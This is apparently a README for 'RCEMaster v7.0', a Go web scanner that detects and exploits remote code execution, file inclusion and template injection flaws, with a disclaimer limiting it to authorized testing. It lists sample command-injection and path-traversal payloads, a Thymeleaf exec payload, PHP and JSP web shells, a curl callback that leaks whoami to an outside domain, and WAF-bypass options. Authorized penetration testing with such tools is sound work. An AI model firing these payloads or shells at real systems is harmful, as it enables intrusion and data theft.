# 🚀 RCEMaster v7.0: ELITE EDITION

**The Ultimate AI-Adaptive Remote Code Execution & Vulnerability Scanner**



---

## 📋 Table of Contents

- [Overview](#-overview)
- [Features](#-features)
- [Installation](#-installation)
- [Usage](#-usage)
- [Examples](#-examples)
- [Output](#-example-output)
- [Disclaimer](#-disclaimer--ethical-use)
- [License](#-license)

---

## 🎯 Overview

**RCEMaster v7.0** is an enterprise-grade, AI-adaptive cybersecurity tool written in **Golang**. It combines human-like thinking with advanced automation to detect and exploit Remote Code Execution (RCE), Local File Inclusion (LFI), Server-Side Template Injection (SSTI), and other critical vulnerabilities.

Unlike traditional scanners that blindly fire payloads, RCEMaster **analyzes the target**, **adapts its strategy**, and **intelligently selects attack vectors** based on the detected technology stack, WAF presence, and response patterns.

---

## ✨ Features

### 🧠 AI-Adaptive Intelligence
- **Smart Reconnaissance:** Automatically detects tech stack (PHP, Java, Python, Node.js, .NET)
- **WAF Fingerprinting:** Identifies Cloudflare, AWS WAF, Akamai, and adapts bypass techniques
- **Human-Like Decision Making:** If target returns 403, auto-enables WAF bypass headers. If 500, flags error-based injection vectors
- **Parameter Discovery:** Automatically finds and injects into URL parameters, JSON bodies, and form fields

### 💥 200+ Attack Vectors

#### Command Injection

- Basic: `;id`, `|id`, `&&id`, `` `id` ``, `$(id)`
- Advanced: `%0Aid`, `%0Did`, `;sleep 5`, `|sleep 5`
- Encoding Bypasses: Base64, Hex, Variable expansion, IFS bypass

#### Local File Inclusion (LFI) / Path Traversal

- Linux: `../../../../etc/passwd`, `..%2f..%2f..%2fetc%2fpasswd`
- Windows: `../../../../Windows/win.ini`, `..\\..\\..\\Windows\\win.ini`
- PHP Wrappers: `php://filter/convert.base64-encode/resource=index.php`

#### Server-Side Template Injection (SSTI)

- Jinja2: `{{7*7}}`, `${7*7}`, `{{config}}`
- Thymeleaf: `${T(java.lang.Runtime).getRuntime().exec('id')}`
- Twig, Velocity, Freemarker, and more

#### File Upload RCE

- PHP shells: `<?php system($_GET['cmd']); ?>`
- JSP shells: `<% Runtime.getRuntime().exec(...) %>`

### 🔥 Elite Features

#### 1. OOB (Out-of-Band) Blind RCE Detection

- **Flag:** `-oob yourdomain.interact.sh`
- Generates DNS/HTTP callback payloads for 100% reliable blind RCE detection
- Example: `curl http://$(whoami).yourdomain.interact.sh`

#### 2. JSON & XML Body Injection

- Automatically detects `Content-Type: application/json`
- Wraps payloads in JSON format: `{"cmd": "PAYLOAD"}`
- Perfect for modern REST APIs

#### 3. Smart Concurrency (Worker Pool)

- **Flag:** `-c 20` (default: 20 concurrent requests)
- Prevents IP bans from Cloudflare/Akamai
- Maintains high speed while staying stealthy

#### 4. Custom Headers & Cookies (Authenticated RCE)

- **Flag:** `-H "Authorization: Bearer token"`
- **Flag:** `-cookie "session=abc123"`
- Test protected admin panels and authenticated endpoints

#### 5. Custom Wordlist Support

- **Flag:** `-w payloads.txt`
- Load your own SecLists or custom payloads
- Automatically appends to built-in databases

#### 6. Multi-Method Parallel Execution

- Tests GET, POST, PUT, DELETE, PATCH simultaneously
- If one method fails, others may succeed

#### 7. Curl-Like Deep Request Engine

- Sends realistic browser headers
- Proper Accept, Accept-Language, Connection headers
- Evades basic bot detection

---

## 📦 Installation

### Method 1: Go Install (Recommended)

```bash

go install github.com/supreamhacker/rcemaster@latest

Note: Ensure your $GOPATH/bin or $HOME/go/bin is in your system's PATH.

Method 2: Build from Source

git clone https://github.com/supreamhacker/rcemaster.git
cd rcemaster
go mod tidy
go build -o rcemaster main.go

Verify Installation

rcemaster -h


🛠️ Usage

Basic Syntax

rcemaster -u <target_url> [flags]


All Available Flags



Flag                        Description                                      Example


-u                          Single target URL                                -u https://target.com/page?id=1

-f                          File containing list of URLs                     -f urls.txt

-w                          Custom wordlist file                             -w payloads.txt

-H                          Custom header                                    -H "Authorization: Bearer token123"

-cookie                     Custom cookies                                   -cookie "session=abc; user=admin"

-oob                        OOB domain for blind RCE                         -oob xyz.interact.sh

-c                          Max concurrent requests                          -c 20 (default: 20)

-o                          Output file (JSON)                               -o results.json

-delay                      Delay between requests                           -delay 500ms

-proxy                      Proxy URL                                        -proxy http://127.0.0.1:8080

📚 Examples

Example 1: Basic Scan

rcemaster -u "http://testfire.net/index.jsp?content=business_insurance.htm"


Example 2: With Custom Concurrency & Delay

rcemaster -u "https://target.com/api/search?q=test" -c 30 -delay 200ms


Example 3: OOB Blind RCE Detection

rcemaster -u "https://target.com/exec?cmd=whoami" -oob abc123.interact.sh


Example 4: Authenticated RCE Testing

rcemaster -u "https://target.com/admin/upload" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIs..." \
  -cookie "session=abc123; user=admin"


Example 5: Bulk Testing from File

rcemaster -f urls.txt -o results.json -delay 500ms


Example 6: Custom Wordlist

rcemaster -u "https://target.com/page?id=1" -w custom_payloads.txt


Example 7: JSON API Testing

rcemaster -u "https://api.target.com/v1/exec" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer token123"


Example 8: With Burp Suite Proxy

rcemaster -u "https://target.com/page?id=1" \
  -proxy http://127.0.0.1:8080 \
  -delay 100ms


Example 9: Complete Elite Command

rcemaster -u "https://target.com/api/search?q=test" \
  -H "Authorization: Bearer token123" \
  -cookie "session=abc" \
  -oob xyz.interact.sh \
  -w custom.txt \
  -c 25 \
  -delay 300ms \
  -o results.json \
  -proxy http://127.0.0.1:8080


📊 Example Output



  ____  _____ _____    __  __           _      
 |  _ \| ____|_   _|  |  \/  | __ _ _ __ | |_ ___
 | |_) |  _|   | |    | |\/| |/ _` | '_ \| __/ _ \
 |  _ <| |___  | |    | |  | | (_| | | | | ||  __/
 |_| \_\_____| |_|    |_|  |_|\__,_|_| |_|\__\___|
====================================================
 [!] RCEMaster v7.0: ELITE EDITION
 [!] AI-Adaptive | OOB Blind RCE | JSON Injection
 [!] Smart Concurrency | Human-Like Error Analysis
====================================================

[*] Target: http://testfire.net/index.jsp?content=business_insurance.htm
[*] Phase 1: Deep Recon & Adaptive Analysis...
[+] Detected: java  | WAF:  | Params: true | JSON: false
[*] Phase 2: Starting Elite Multi-Vector Attack...

========== 🎯 RCE / LFI SUCCESSFUL 🎯 ==========
[HIT] http://testfire.net/index.jsp?content=..%2f..%2f..%2f..%2fetc%2fpasswd (GET)
   -> Vector  : LFI / Path Traversal
   -> Payload : ..%2f..%2f..%2f..%2fetc%2fpasswd
   -> Evidence: root:x:0:0:root:/root:/bin/bash

====================================================


🎯 When to Use RCEMaster


Use this tool for:

Bug Bounty Hunting: Find RCE/LFI/SSTI in authorized programs
Penetration Testing: Assess web application security
Vulnerability Assessment: Scan your own applications
CTF Challenges: Solve security challenges
Security Research: Study exploitation techniques

⚠️ Disclaimer & Ethical Use

RCEMaster v7.0 is intended strictly for Educational Purposes, Authorized Bug Bounty Hunting, and Internal Security Auditing.

🚫 DO NOT:

Use this tool on systems you don't own or have explicit written permission to test
Attack government, military, or critical infrastructure without authorization
Use this tool for illegal activities or malicious purposes
Distribute exploits or vulnerabilities without responsible disclosure

✅ DO:

Only test targets with explicit authorization (bug bounty programs, your own systems)
Report vulnerabilities responsibly through proper channels
Use this tool to improve security, not to cause harm
Follow all applicable laws and regulations

The authors are not responsible for any misuse or damage caused by this tool. Use it responsibly and ethically. 🛡️


🤝 Contributing

Contributions, issues, and feature requests are welcome! Feel free to check the issues page or open a Pull Request.

📜 License

This project is licensed under the MIT License - see the LICENSE file for details.

🙏 Credits

Inspired by:

Commix - Command injection exploitation tool
Nuclei - Fast vulnerability scanner
ysoserial - Java deserialization payloads
tplmap - SSTI detection tool
Bug bounty reports from HackerOne & Bugcrowd

Built with ❤️ in Go for the cybersecurity community.

